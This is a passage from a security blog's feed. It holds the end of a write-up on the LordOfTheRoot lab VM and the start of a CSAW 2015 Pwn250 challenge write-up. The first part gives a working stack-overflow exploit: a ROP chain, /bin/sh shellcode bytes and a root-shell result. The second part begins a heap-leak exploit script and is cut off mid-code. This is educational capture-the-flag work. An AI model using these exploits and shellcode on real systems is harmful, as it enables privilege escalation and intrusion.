</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>objdump -d -M intel --no-show-raw-insn /SECRET/door3/file <span class="p">|</span>less
</span><span class='line'>
</span><span class='line'>0804845d &lt;main&gt;:
</span><span class='line'> 804845d:       push   ebp
</span><span class='line'> 804845e:       mov    ebp,esp
</span><span class='line'> 8048460:       and    esp,0xfffffff0
</span><span class='line'> 8048463:       sub    esp,0xb0
</span><span class='line'> 8048469:       cmp    DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>,0x1
</span><span class='line'> 804846d:       jg     <span class="m">8048490</span> &lt;main+0x33&gt;
</span><span class='line'> 804846f:       mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'> 8048472:       mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'> 8048474:       mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 8048478:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048540
</span><span class='line'> 804847f:       call   <span class="m">8048310</span> &lt;<span class="nb">printf</span>@plt&gt;
</span><span class='line'> 8048484:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
</span><span class='line'> 804848b:       call   <span class="m">8048340</span> &lt;<span class="nb">exit</span>@plt&gt;
</span><span class='line'> 8048490:       mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
</span><span class='line'> 8048493:       add    eax,0x4
</span><span class='line'> 8048496:       mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
</span><span class='line'> 8048498:       mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 804849c:       lea    eax,<span class="o">[</span>esp+0x11<span class="o">]</span>
</span><span class='line'> 80484a0:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 80484a3:       call   <span class="m">8048320</span> &lt;strcpy@plt&gt;
</span><span class='line'> 80484a8:       mov    eax,0x0
</span><span class='line'> 80484ad:       leave
</span><span class='line'> 80484ae:       ret
</span><span class='line'> 80484af:       nop
</span></code></pre></td></tr></table></div></figure>


<p>I quickly found that I had to run the binary with the first argument containing 171 chars + EIP to overwrite the saved return address on the stack. Let&rsquo;s see how we can spawn a shell&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -q ./door3
</span><span class='line'>Reading symbols from /home/bas/downloads/LotR/door3...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Okay, so no protections whatsoever. We could place shellcode on the stack and pwn like it&rsquo;s 1999.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*171+&quot;BBBBCCCC&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xf7fbeff4 --&gt; 0x15fd7c
</span><span class='line'>ECX: 0x0
</span><span class='line'>EDX: 0xb4
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xffffd530 <span class="o">(</span><span class="s2">&quot;CCCC&quot;</span><span class="o">)</span>
</span><span class='line'>EIP: 0x42424242 <span class="o">(</span><span class="s1">&#39;BBBB&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x42424242
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xffffd530 <span class="o">(</span><span class="s2">&quot;CCCC&quot;</span><span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xffffd534 --&gt; 0xffffd500 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">44</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;BBBBCCCC&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xffffd538 --&gt; 0xffffd5e0 --&gt; 0xffffd7e5 <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-bas&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xffffd53c --&gt; 0xf7fde860 --&gt; 0xf7e5f000 --&gt; 0x464c457f
</span><span class='line'>0016<span class="p">|</span> 0xffffd540 --&gt; 0xf7ff4821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0020<span class="p">|</span> 0xffffd544 --&gt; 0xffffffff
</span><span class='line'>0024<span class="p">|</span> 0xffffd548 --&gt; 0xf7ffcff4 --&gt; 0x1cf2c
</span><span class='line'>0028<span class="p">|</span> 0xffffd54c --&gt; 0x8048249 <span class="o">(</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s just jump to the stack! However, there is no <code>jmp esp</code> opcode in the binary, so it looks like we have a problem. ASLR <em>is</em> enabled on the remote box and none of the registers point directly to the &ldquo;shellcode&rdquo; on the stack. We can hardcode the stack address but that will lead to lots of failed attempts. Let&rsquo;s be smart about this.</p>

<p>Verify no <code>jmp esp</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>asmsearch <span class="s2">&quot;jmp esp&quot;</span>
</span><span class='line'>Searching <span class="k">for</span> ASM code: <span class="s1">&#39;jmp esp&#39;</span> in: binary ranges
</span><span class='line'>0x08048365 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
</span><span class='line'>0x08048460 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
</span><span class='line'>0x08048c1b : <span class="o">(</span>00e4<span class="o">)</span> add    ah,ah
</span><span class='line'>0x08049365 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
</span><span class='line'>0x08049460 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
</span><span class='line'>gdb-peda<span class="nv">$ </span>asmsearch <span class="s2">&quot;call esp&quot;</span>
</span><span class='line'>Searching <span class="k">for</span> ASM code: <span class="s1">&#39;call esp&#39;</span> in: binary ranges
</span><span class='line'>0x0804864f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
</span><span class='line'>0x08048a6f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
</span><span class='line'>0x08048a73 : <span class="o">(</span>08d4<span class="o">)</span> or     ah,dl
</span><span class='line'>0x08048e0f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
</span><span class='line'>0x0804964f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xd4&quot;</span> binary
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;\xff\xd4&#39;</span> in: binary ranges
</span><span class='line'>Not found
</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xe4&quot;</span> binary
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;\xff\xe4&#39;</span> in: binary ranges
</span><span class='line'>Not found
</span></code></pre></td></tr></table></div></figure>


<p>However, we do have <code>strcpy</code> and this memory region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x08049000 r-xp    /home/bas/downloads/LotR/door3
</span><span class='line'>0x08049000 0x0804a000 rwxp    /home/bas/downloads/LotR/door3
</span></code></pre></td></tr></table></div></figure>


<p><code>0x08049000</code> is <code>rwx</code>! We can now use <code>strcpy</code> to write <code>ff e4</code> to memory and return to it, which bypasses ASLR because the binary is always loaded on the same address. Let&rsquo;s ROP this! <code>strcpy@plt</code> is at 0x8048320 but we can&rsquo;t use that address because it contains a space. We&rsquo;ll just use strcpy+6, which jumps to the resolver to resolve strcpy.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/4i 0x8048320
</span><span class='line'>   0x8048320 &lt;strcpy@plt&gt;:  jmp    DWORD PTR ds:0x8049740
</span><span class='line'>   0x8048326 &lt;strcpy@plt+6&gt;:    push   0x8
</span><span class='line'>   0x804832b &lt;strcpy@plt+11&gt;:   jmp    0x8048300
</span><span class='line'>   0x8048330 &lt;__gmon_start__@plt&gt;:  jmp    DWORD PTR ds:0x8049744
</span></code></pre></td></tr></table></div></figure>


<p>With that out of the way, we need a pop2ret to balance the stack. This is easily located with gdb-peda&rsquo;s <code>ropgadget</code> command and I chose 0x804850e. Last thing I needed was the address of the bytes <code>0xff</code> and <code>0xe4</code> and again gdb-peda provided those. Putting the ROP chain together:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># strcpy(dest, src)</span>
</span><span class='line'>  <span class="c"># use strcpy+6 otherwise the address will contain a space, messes up argv</span>
</span><span class='line'>  <span class="c"># second address is pop2ret</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048326</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804850e</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">where</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">what</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">z</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">171</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">write</span><span class="p">(</span><span class="mh">0x804852c</span><span class="p">,</span> <span class="mh">0x8049330</span><span class="p">)</span> <span class="c"># ff</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">write</span><span class="p">(</span><span class="mh">0x8048366</span><span class="p">,</span> <span class="mh">0x8049331</span><span class="p">)</span> <span class="c"># e4 jmp esp</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049330</span><span class="p">)</span>
</span><span class='line'><span class="c"># modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Death to nopsleds!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>md5sum /SECRET/door*/file
</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door1/file
</span><span class='line'>bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door2/file
</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door3/file
</span><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>/SECRET/door2/file <span class="k">$(</span>python poc.py<span class="k">)</span>
</span><span class='line'><span class="c"># whoami</span>
</span><span class='line'>root
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>And there you go. A reliable way to spawn a root shell from that vulnerable binary. Game over.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/Flag*</span>
</span><span class='line'><span class="s2">&quot;There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.&quot;</span>
</span><span class='line'>– Gandalf
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250/"/>
    <updated>2015-09-22T23:00:00+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250</id>
    <content type="html"><![CDATA[<p>This CTF marked our team&rsquo;s anniversary! We managed to pop this pwnable.</p>

<!--more-->


<p>We&rsquo;re given a 32-bit ELF binary, which uses malloc() and free(). Must be some kind of heap vulnerability then, right?</p>

<p>The binary is some kind of contact storage. We can enter names, phone numbers and descriptions. The name gets stored in the .bss segment, while the phone number and description are stored on the heap. We can overflow the name field like so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Menu:
</span><span class='line'>1)Create contact
</span><span class='line'>2)Remove contact
</span><span class='line'>3)Edit contact
</span><span class='line'>4)Display contacts
</span><span class='line'>5)Exit
</span><span class='line'>&gt;&gt;&gt; 1
</span><span class='line'>Contact info: 
</span><span class='line'>  Name: BARREBAS
</span><span class='line'>[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
</span><span class='line'>  Enter Phone No: 0  
</span><span class='line'>  Length of description: 100       
</span><span class='line'>  Enter description:
</span><span class='line'>      BLEH
</span><span class='line'>Menu:
</span><span class='line'>1)Create contact
</span><span class='line'>2)Remove contact
</span><span class='line'>3)Edit contact
</span><span class='line'>4)Display contacts
</span><span class='line'>5)Exit
</span><span class='line'>&gt;&gt;&gt; 4
</span><span class='line'>Contacts:
</span><span class='line'>  Name: BARREBAS
</span><span class='line'>  Length 100
</span><span class='line'>  Phone #: 0
</span><span class='line'>  Description: BLEH
</span><span class='line'>Menu:
</span><span class='line'>1)Create contact
</span><span class='line'>2)Remove contact
</span><span class='line'>3)Edit contact
</span><span class='line'>4)Display contacts
</span><span class='line'>5)Exit
</span><span class='line'>&gt;&gt;&gt; 3
</span><span class='line'>Name to change? BARREBAS
</span><span class='line'>1.Change name
</span><span class='line'>2.Change description
</span><span class='line'>&gt;&gt;&gt; 1
</span><span class='line'>New name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>Menu:
</span><span class='line'>1)Create contact
</span><span class='line'>2)Remove contact
</span><span class='line'>3)Edit contact
</span><span class='line'>4)Display contacts
</span><span class='line'>5)Exit
</span><span class='line'>&gt;&gt;&gt; 4
</span><span class='line'>Contacts:
</span><span class='line'>  Name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>  Length 1111638594
</span><span class='line'>  Phone #: 0
</span><span class='line'>  Description: BLEH</span></code></pre></td></tr></table></div></figure>


<p>So suppose the struct looked something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">phoneNumber</span><span class="p">;</span>  <span class="c1">// malloc&#39;ed</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">description</span><span class="p">;</span>  <span class="c1">// malloc&#39;ed</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">descriptionLength</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">valid</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="kt">info_t</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can use this to leak information by overwriting the <strong>next</strong> struct&rsquo;s <em>phoneNumber</em> and <em>description</em>. We cannot use this to write anything, as the program will automatically call free() on the description. If it doesn&rsquo;t contain a valid heap address, the binary will crash. First, we&rsquo;ll abuse the leak to determine the remote libc version.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>    <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;leaking &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">last_addr</span>
</span><span class='line'>  <span class="c"># edit contact 1 -&gt; name to overflow pointers</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">last_addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span>
</span><span class='line'>  
